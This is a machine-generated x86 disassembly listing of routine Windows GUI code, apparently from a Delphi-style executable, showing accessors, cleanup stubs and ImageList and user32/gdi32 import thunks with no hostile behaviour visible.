retn
sub_423064
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_423118
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_423128
push ebx
mov ebx eax
mov eax ebx
call sub_4232e0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42313c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_423158
push ebx
mov ebx eax
mov eax ebx
call sub_423340
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4231b4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4232c3
jmp sub_4038a0
sub_423527
jmp sub_4035ec
sub_423587
jmp sub_4038a0
sub_42358e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42396f
jmp sub_4038a0
sub_42399b
jmp sub_4038a0
sub_423a02
jmp sub_4035ec
sub_423a33
jmp sub_4038a0
sub_423ab8
jmp sub_4035ec
sub_423abd
mov eax [ ebp - 0x38 ]
call sub_403164
call sub_403900
call sub_403954
sub_423acf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423aec
mov eax [ ebp - 0x18 ]
call sub_402754
retn
sub_423ae5
jmp sub_4038a0
sub_423c3b
jmp sub_4035ec
sub_423f07
jmp sub_4035ec
sub_423f98
mov cl 0x1
call sub_423fa0
retn
sub_424255
add [ eax ] al
add [ ebx ] dh
leave
call sub_423fa0
retn
sub_4242da
jmp sub_4035ec
sub_4242df
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403900
call sub_403954
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_424330
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_424469
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_424498
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4244ac
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4245c5
jmp sub_4035ec
sub_42467a
jmp sub_4035ec
sub_4246e4
jmp sub_4035ec
sub_424718
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_4246a4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_424730
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_420668
retn
mov [ eax + 0x30 ] edx
retn
sub_424748
retn
sub_42474c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_420668
retn
mov [ eax + 0x2c ] edx
retn
sub_42478c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_420668
pop ebp
retn 0x4
sub_4247a0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_420668
pop ebp
retn 0x4
sub_424960
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42496c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_424a19
jmp sub_4038a0
sub_424a20
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424b0b
jmp sub_4035ec
sub_424b77
jmp sub_4038a0
sub_424ca5
jmp sub_4038a0
sub_424cac
pop ebp
retn
sub_424dac
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_424de1
jmp sub_4038a0
sub_424de8
pop ebp
retn
sub_424dec
sub [ rw-data ] 0x1
retn
sub_425034
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_416b18
retn
sub_425068
mov eax [ eax + 0x4 ]
call sub_4169bc
retn
sub_425099
jmp sub_4038a0
sub_4250a0
pop ebp
retn
sub_4250a4
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_14(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_14(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_14(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_14(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ __import_lookup_table_14(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_14(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_SetIconSize) ]
sub_42518d
jmp sub_4038a0
sub_425194
pop ebp
retn
sub_425198
sub [ rw-data ] 0x1
retn
sub_42525f
jmp sub_4038a0
sub_425266
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42587c
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_425288
mov [ rw-data ] sub_4253a0
mov [ rw-data ] sub_425310
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_4255a4
mov [ rw-data ] sub_425678
mov [ rw-data ] sub_42574c
retn
sub_42590d
jmp sub_4038a0
sub_425914
pop ebp
retn
sub_425918
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42587c
sub_42594d
jmp sub_4038a0
sub_425954
pop ebp
retn
sub_425958
sub [ rw-data ] 0x1
retn
sub_425be7
add eax 0xffffffd4
jmp sub_426714
sub_425bef
add eax 0xffffffd4
jmp sub_426770
sub_425bf7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405808
sub_425c01
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405830
sub_425c0b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405844
sub_425d9a
jmp sub_4038a0
sub_425da1
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425fb1
jmp sub_4038a0
sub_425fb8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42616d
jmp sub_4038a0
sub_4261d2
jmp sub_4038a0
sub_4261d9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4262c5
jmp sub_4038a0
sub_4262cc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4264dc
lea eax [ ebp - 0x30 ]
call sub_403e9c
lea eax [ ebp - 0x20 ]
call sub_403e9c
retn
sub_4264ed
jmp sub_4038a0
j_sub_4264dc
jmp sub_4264dc
sub_4264f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4265ef
jmp sub_4038a0
sub_4265f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4266f3
jmp sub_4038a0
sub_4266fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426763
jmp sub_4038a0
sub_42676a
pop ebx
pop ecx
pop ebp
retn
sub_426805
jmp sub_4038a0
sub_42680c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_426818
mov eax [ eax + 0x20 ]
retn
sub_426947
jmp sub_4038a0
sub_42694e
pop ebp
retn
sub_426950
sub [ rw-data ] 0x1
retn
sub_42697d
jmp sub_4038a0
sub_426984
pop ebp
retn
sub_426988
sub [ rw-data ] 0x1
retn
sub_4269c1
jmp sub_4038a0
sub_4269c8
pop ebp
retn
sub_4269cc
sub [ rw-data ] 0x1
retn
sub_426cd9
jmp sub_4038a0
sub_426ce0
pop ebp
retn
sub_426ce4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_426a30
sub_426dc4
retn
sub_426e38
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_426e44
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_426e50
mov edx [ eax ]
call [ edx ]
retn
sub_426e58
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_426e85
jmp sub_4038a0
sub_426e8c
pop ebp
retn
sub_426e90
sub [ rw-data ] 0x1
retn
sub_42704f
jmp sub_4038a0
sub_427056
pop ebp
retn
sub_42740b
jmp sub_4038a0
sub_427412
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42782c
jmp sub_4038a0
sub_427833
pop ebp
retn
sub_427838
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426dc8
mov [ rw-data ] eax
sub_427879
jmp sub_4038a0
sub_427880
pop ebp
retn
sub_427884
sub [ rw-data ] 0x1
retn
sub_4278b1
jmp sub_4038a0
sub_4278b8
pop ebp
retn
sub_4278bc
sub [ rw-data ] 0x1
retn
sub_4278e9
jmp sub_4038a0
sub_4278f0
pop ebp
retn
sub_4278f4
sub [ rw-data ] 0x1
retn
sub_427921
jmp sub_4038a0
sub_427928
pop ebp
retn
sub_42792c
sub [ rw-data ] 0x1
retn
sub_427959
jmp sub_4038a0
sub_427960
pop ebp
retn
sub_427964
sub [ rw-data ] 0x1
retn
sub_427991
jmp sub_4038a0
sub_427998
pop ebp
retn
sub_42799c
sub [ rw-data ] 0x1
retn
sub_4279c9
jmp sub_4038a0
sub_4279d0
pop ebp
retn
sub_4279d4
sub [ rw-data ] 0x1
retn
sub_427a01
jmp sub_4038a0
sub_427a08
pop ebp
retn
sub_427a0c
sub [ rw-data ] 0x1
retn
sub_427a39
jmp sub_4038a0
sub_427a40
pop ebp
retn
sub_427a44
sub [ rw-data ] 0x1
retn
sub_427ab4
inc eax
int3
sub_427cbe
jmp sub_4035ec
sub_427cc3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427ce0
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_427ce8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403360
pop esi
retn
sub_427d00
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403360
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_427d18
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_427dc1
jmp sub_4038a0
sub_427def
jmp sub_4038a0
sub_427df6
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427e00
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_427e14
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_428072
jmp sub_4038a0
sub_428079
pop ebp
retn
sub_42961e
jmp sub_4035ec
sub_4296d7
jmp sub_4038a0
sub_4296de
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4296e4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_429658
sub_4296f4
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_429658
sub_429704
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_429658
pop ebp
retn 0x8
sub_42971c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_429848
push ebx
mov ebx eax
mov eax ebx
call sub_43aec0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42985c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_429890
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_429994
jmp sub_4038a0
sub_42999b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429b3e
jmp sub_4038a0
sub_429b45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429b4f
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_429b64
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_4381a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429b80
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_4381a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429b9c
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_4381a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429bb8
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_4381a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429bd4
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_438e88
sub_429be8
mov al [ eax + 0x220 ]
retn
sub_429d51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_429d69
jmp sub_4038a0
sub_42a075
jmp sub_4035ec
sub_42a1e8
retn
sub_42a375
jmp sub_4038a0
sub_42a3f8
push ebx
mov ebx eax
mov eax ebx
call sub_4371bc
mov eax ebx
call sub_42a1ec
pop ebx
retn
sub_42a40c
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_4378dc
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42a534
pop ebx
retn
sub_42a524
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42a5fd
jmp sub_4038a0
sub_42a604
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a64c
push ebx
mov ebx eax
mov eax ebx
call sub_43ae44
mov eax ebx
call sub_42a1ec
pop ebx
retn
sub_42a660
push ebx
mov ebx eax
mov eax ebx
call sub_42e0c0
mov eax ebx
call sub_42a1ec
pop ebx
retn
sub_42a674
mov al 0x1
retn
sub_42a678
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42a9b0
jmp sub_4038a0
sub_42a9b7
pop ebp
retn
sub_42a9bc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c24
mov eax [ r-xdata ]
call sub_416354
mov edx [ r-xdata ]
mov eax [ sub_4280bc ]
call sub_4163a0
sub_42aa11
jmp sub_4038a0
sub_42aa18
pop ebp
retn
sub_42aa1c
sub [ rw-data ] 0x1
retn
sub_42aa55
jmp sub_4038a0
sub_42aa5c
pop ebp
retn
sub_42aa60
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42aadc
retn
sub_42aadd
jmp sub_4038a0
j_sub_42aadc
jmp sub_42aadc
sub_42aae4
pop ebp
retn
sub_42aae8
sub [ rw-data ] 0x1
retn
sub_42aaf0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403164
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42abb4
jmp sub_4038a0
sub_42abbb
pop ebp
retn
sub_42abc0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42ab0c
call sub_403c70
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b78
sub_42ac0d
jmp sub_4038a0
sub_42ac14
pop ebp
retn
sub_42ac18
sub [ rw-data ] 0x1
retn
sub_42ac74
jmp sub_4038a0
sub_42ac7b
pop ebp
retn
sub_42ac80
sub [ rw-data ] 0x1
retn
sub_42acdc
jmp sub_4038a0
sub_42ace3
pop ebp
retn
sub_42ace8
sub [ rw-data ] 0x1
retn
sub_42ad49
jmp sub_4038a0
sub_42ad50
pop ebp
retn
sub_42ad54
sub [ rw-data ] 0x1
retn
sub_42ada0
jmp sub_4038a0
sub_42ada7
pop ebp
retn
sub_42adac
sub [ rw-data ] 0x1
retn
sub_42add9
jmp sub_4038a0
sub_42ade0
pop ebp
retn
sub_42ade4
sub [ rw-data ] 0x1
retn
sub_42ae8c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bcbc
mov [ rw-data ] eax
sub_42aec1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42aed8
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42af5b
jmp sub_4038a0
sub_42af62
pop ebp
retn
sub_42af64
sub [ rw-data ] 0x1
retn
sub_42afd3
jmp [ edi ]
sub_42b274
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42b28c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42b2d0
push ebx
mov ebx eax
mov eax ebx
call sub_42b9f8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42b9e7
jmp sub_4038a0
sub_42b9f8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_4277bc
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42b2a0
sub_42ba4f
jmp sub_4038a0
sub_42ba56
pop ebp
retn
sub_42ba58
sub [ rw-data ] 0x1
retn
sub_42cc25
adc al 0x43
add [ eax ] ch
int3
sub_42cd9a
inc edx
add [ eax ] ch
int3
sub_42d46a
inc edx
add [ eax ] ch
int3
sub_42dc3b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x54d9172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42dff6
jmp sub_4038a0
sub_42dffd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e082
jmp sub_4038a0
sub_42e089
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e090
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4381a8
pop ebx
retn
sub_42e0a4
push ebx
mov ebx eax
mov eax ebx
call sub_43af00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4381a8
pop ebx
retn
sub_42e0c0
push ebx
mov ebx eax
mov eax ebx
call sub_439ed4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e16c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43510c
pop esi
pop ebx
retn
sub_42e2d6
jmp sub_4038a0
sub_42e2dd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e3ec
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4371bc
mov eax ebx
mov si 0xffc7
call sub_403360
pop esi
pop ebx
retn
sub_42e4d8
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e4f4
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403360
sub_42e510
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_42e51c
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41c588
sub_42e530
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e590
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e604
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403360
pop esi
pop ebx
retn
sub_42e620
push esi
mov esi eax
mov eax esi
call sub_436cc8
mov eax esi
mov si 0xffc7
call sub_403360
pop esi
retn
sub_42e6c5
jmp sub_4038a0
sub_42e6cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e6d4
push ebx
mov ebx eax
mov eax ebx
call sub_436e2c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_42e6f8
push ebx
mov ebx eax
mov eax ebx
call sub_436e44
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_42e7ce
jmp sub_4038a0
sub_42e878
mov eax [ r-xdata ]
retn
sub_42e880
xor eax eax
retn
sub_42e8a4
retn
sub_42e9bc
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_438e88
sub_42ea34
push ebx
mov ebx eax
mov eax ebx
call sub_44bae0
test eax eax
je r-xdata
mov eax ebx
call sub_43663c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_42ea58
xor eax eax
retn
sub_42eb1f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6289173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_42eb38
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403360
sub_42ec29
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_42ec32
jmp sub_4038a0
j_sub_42ec29
jmp sub_42ec29
sub_42ec39
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ed6c
mov al [ eax + 0x211 ]
retn
sub_42eda0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_438e88
sub_42ef80
call sub_438e88
retn
sub_42effd
jmp sub_4038a0
sub_42f004
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f061
jmp sub_4038a0
sub_42f068
pop ebp
retn
sub_42f06c
sub [ rw-data ] 0x1
retn
sub_42f1c9
jmp sub_4038a0
sub_42f1d0
pop ebp
retn
sub_42f1d4
sub [ rw-data ] 0x1
retn
sub_42f1ed
add eax 0xffffffe0
jmp sub_42f7d4
sub_42f1f5
add eax 0xffffffe0
jmp sub_42f83c
sub_42f1fd
add eax 0xffffffe0
jmp sub_42f950
sub_42f205
add eax 0xffffffe0
jmp sub_42f9c4
sub_42f20d
add eax 0xffffffe0
jmp sub_42f480
sub_42f215
add eax 0xffffffe0
jmp sub_42f494
sub_42f21d
add eax 0xffffffe0
jmp sub_42f50c
sub_42f225
add eax 0xffffffe0
jmp sub_42f5b0
sub_42f22d
add eax 0xffffffe0
jmp sub_42f5b4
sub_42f235
add eax 0xffffffe0
jmp sub_42f63c
sub_42f23d
add eax 0xffffffe0
jmp sub_42f784
sub_42f245
add eax 0xffffffe0
jmp sub_42f788
sub_42f24d
add eax 0xffffffe0
jmp sub_42f7a4
sub_42f255
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405808
sub_42f25f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405830
sub_42f269
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405844
sub_42f43d
jmp sub_4038a0
sub_42f444
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f480
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ef0
pop ebx
retn
sub_42f4fb
jmp sub_4038a0
sub_42f502
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f594
jmp sub_4038a0
sub_42f59b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f5b0
mov al 0x1
retn
sub_42f62f
jmp sub_4038a0
sub_42f636
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f734
jmp sub_4038a0
sub_42f73b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f784
mov [ eax + 0xc ] edx
retn
sub_42f788
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_42f82c
jmp sub_4038a0
sub_42f833
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f932
jmp sub_4038a0
sub_42f939
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f9b2
jmp sub_4038a0
sub_42f9b9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fa44
jmp sub_4038a0
sub_42fa4b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fb3f
jmp sub_4038a0
sub_42fb46
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42fc08
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_42fb54
call EnumWindows
retn
sub_42fc9a
jmp sub_4038a0
sub_42fca1
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42fcac
xor eax eax
retn
sub_42fda5
jmp sub_4038a0
sub_42fdac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fe96
jmp sub_4038a0
sub_42fe9d
pop ebp
retn
sub_42fef2
jmp sub_4038a0
sub_42fef9
pop ebp
retn
sub_43107c
jmp r-xdata
sub_43107e
0xe8ffe9ff 0xe7ff
sub_431085
jmp esi
sub_4319aa
inc ebx
add [ ecx ] al
add [ edi ] cl
add [ eax ] bl

sub_431a19
adc al 0x43
add [ eax ] ch
int3
sub_431d21
add eax 0xffffff8c
jmp sub_43de7c
sub_431d29
add eax 0xffffff8c
jmp sub_43de80
sub_431d31
add eax 0xffffff8c
jmp sub_43df6c
sub_431d39
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_431d46
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_431d53
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_431d60
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_431d6d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_431d7a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_431d87
